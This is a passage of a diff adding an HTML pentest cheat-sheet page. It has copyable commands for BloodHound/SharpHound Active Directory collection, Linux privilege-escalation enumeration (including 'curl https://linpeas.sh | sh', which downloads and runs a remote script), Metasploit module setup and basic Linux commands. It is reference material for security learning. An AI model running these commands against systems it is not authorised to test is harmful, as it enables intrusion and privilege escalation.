+          <div class="note-header" onclick="toggle(this)">
+            <span class="note-title">BloodHound / SharpHound</span>
+            <span class="note-tag">AD Enum</span>
+          </div>
+          <div class="note-body">
+            <p>Collect AD data for BloodHound analysis.</p>
+            <div class="cmd-block">
+              <span class="comment"># Run SharpHound collector</span>
+              <span class="cmd">.\SharpHound.exe <span class="flag">-c All</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Python version (from Linux)</span>
+              <span class="cmd">bloodhound-python <span class="flag">-u</span> <span class="arg">user</span> <span class="flag">-p</span> <span class="arg">pass</span> <span class="flag">-d</span> <span class="arg">domain.local</span> <span class="flag">-c All</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+          </div>
+        </div>
+
+        
+
+      </section>
+
+      <!-- PRIV ESC -->
+      <section class="notes-section" id="privesc">
+        <div class="section-label">// privilege escalation</div>
+
+        <div class="note-card">
+          <div class="note-header" onclick="toggle(this)">
+            <span class="note-title">Linux PrivEsc — Enumeration</span>
+            <span class="note-tag">Linux</span>
+          </div>
+          <div class="note-body">
+            <div class="cmd-block">
+              <span class="comment"># SUID binaries</span>
+              <span class="cmd">find / <span class="flag">-perm -4000</span> 2>/dev/null</span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Sudo permissions</span>
+              <span class="cmd">sudo <span class="flag">-l</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Run linpeas</span>
+              <span class="cmd">curl <span class="arg">https://linpeas.sh</span> | sh</span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Writable files</span>
+              <span class="cmd">find / <span class="flag">-writable -type f</span> 2>/dev/null | grep -v proc</span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+          </div>
+        </div>
+
+        
+
+      </section>
+
+      <!-- TOOLS -->
+      <section class="notes-section" id="tools">
+        <div class="section-label">// tools reference</div>
+
+        <div class="note-card">
+          <div class="note-header" onclick="toggle(this)">
+            <span class="note-title">Metasploit — Quick Reference</span>
+            <span class="note-tag">MSF</span>
+          </div>
+          <div class="note-body">
+            <div class="cmd-block">
+              <span class="comment"># Search for module</span>
+              <span class="cmd">msf > search <span class="arg">&lt;keyword&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+            <div class="cmd-block">
+              <span class="comment"># Use and configure</span>
+              <span class="cmd">msf > use <span class="arg">&lt;module&gt;</span>
+msf > set RHOSTS <span class="arg">&lt;target&gt;</span>
+msf > set LHOST <span class="arg">&lt;your_ip&gt;</span>
+msf > run</span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+          </div>
+        </div>
+
+     
+
+      </section>
+
+
+      <!-- OS COMMANDS -->
+      <section class="notes-section" id="os">
+        <div class="section-label">// os commands</div>
+
+        <div class="note-card open">
+          <div class="note-header" onclick="toggle(this)">
+            <span class="note-title">Linux — General Commands</span>
+            <span class="note-tag">Linux</span>
+          </div>
+          <div class="note-body">
+
+            <div class="cmd-block">
+              <span class="comment"># echo — outputs what you input</span>
+              <span class="cmd">echo <span class="arg">"hello world"</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+
+            <div class="cmd-block">
+              <span class="comment"># $ — symbol for a variable</span>
+              <span class="cmd"><span class="arg">$MY_VAR</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+
+            <div class="cmd-block">
+              <span class="comment"># mkdir — make a directory</span>
+              <span class="cmd">mkdir <span class="arg">&lt;dirname&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+
+            <div class="cmd-block">
+              <span class="comment"># apt update — update package sources</span>
+              <span class="cmd">sudo apt update</span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+
+            <div class="cmd-block">
+              <span class="comment"># apt upgrade — install package updates</span>
+              <span class="cmd">sudo apt upgrade</span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+
+            <div class="cmd-block">
+              <span class="comment"># useradd (low level) / adduser (high level) — add a user</span>
+              <span class="cmd">sudo useradd <span class="arg">&lt;username&gt;</span>
+sudo adduser <span class="arg">&lt;username&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+
+            <div class="cmd-block">
+              <span class="comment"># userdel / deluser — delete a user</span>
+              <span class="cmd">sudo userdel <span class="arg">&lt;username&gt;</span>
+sudo deluser <span class="arg">&lt;username&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+
+            <div class="cmd-block">
+              <span class="comment"># chmod — change file permissions</span>
+              <span class="cmd">chmod <span class="arg">755 &lt;file&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+
+            <div class="cmd-block">
+              <span class="comment"># grep — highlight/filter text in output</span>
+              <span class="cmd">grep <span class="arg">"pattern"</span> <span class="arg">&lt;file&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+
+            <div class="cmd-block">
+              <span class="comment"># kill — kill a process by PID</span>
+              <span class="cmd">kill <span class="arg">&lt;PID&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+
+            <div class="cmd-block">
+              <span class="comment"># pkill — kill processes by pattern (name, user, program)</span>
+              <span class="cmd">pkill <span class="arg">&lt;process_name&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+
+            <div class="cmd-block">
+              <span class="comment"># whoami — which user am I</span>
+              <span class="cmd">whoami</span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+
+            <div class="cmd-block">
+              <span class="comment"># uname — display OS info (-a for everything)</span>
+              <span class="cmd">uname <span class="flag">-a</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+
+            <div class="cmd-block">
+              <span class="comment"># make — automates compilation using a Makefile</span>
+              <span class="cmd">make</span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+
+            <div class="cmd-block">
+              <span class="comment"># touch — create a file</span>
+              <span class="cmd">touch <span class="arg">&lt;filename&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+
+            <div class="cmd-block">
+              <span class="comment"># rm — delete a file</span>
+              <span class="cmd">rm <span class="arg">&lt;filename&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+
+            <div class="cmd-block">
+              <span class="comment"># cd — move to a directory</span>
+              <span class="cmd">cd <span class="arg">&lt;dirname&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+
+            <div class="cmd-block">
+              <span class="comment"># su — switch to another account</span>
+              <span class="cmd">su <span class="arg">&lt;username&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+
+            <div class="cmd-block">
+              <span class="comment"># curl — connect to a URL</span>
+              <span class="cmd">curl <span class="arg">&lt;url&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+
+            <div class="cmd-block">
+              <span class="comment"># curl -fsSL — f=fail silently, s=silent mode, S=show errors, L=follow redirects</span>
+              <span class="cmd">curl <span class="flag">-fsSL</span> <span class="arg">&lt;url&gt;</span></span>
+              <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+            </div>
+
+          </div>
+        </div>
+      </section>
+
+
+    </div>
+  </div>
+
+  <script>
+    // Toggle note cards
+    function toggle(header) {
+      header.parentElement.classList.toggle('open');
+    }
+
+    // Copy command text
+    function copyCmd(btn) {
+      const block = btn.closest('.cmd-block');
+      const lines = [...block.querySelectorAll('.cmd, .arg')];
+      const text = block.querySelector('.cmd') ? block.querySelector('.cmd').innerText : '';
+      navigator.clipboard.writeText(text).then(() => {
+        btn.textContent = 'copied!';
+        btn.classList.add('copied');
+        setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 1500);
+      });
+    }
+
+    // Scroll reveal
+    const observer = new IntersectionObserver((entries) => {
+      entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+    }, { threshold: 0.08 });
+    document.querySelectorAll('.notes-section').forEach(el => observer.observe(el));
+
+    // Highlight active sidebar link on scroll
+    const sections = document.querySelectorAll('.notes-section');
+    const sidebarLinks = document.querySelectorAll('.sidebar a');
+
+    window.addEventListener('scroll', () => {
+      let current = '';
+      sections.forEach(s => {
+        if (window.scrollY >= s.offsetTop - 120) current = s.id;
+      });
+      sidebarLinks.forEach(a => {
+        a.classList.toggle('active', a.getAttribute('href') === '#' + current);
+      });
+    });
+  </script>
+
+</body>
+</html>
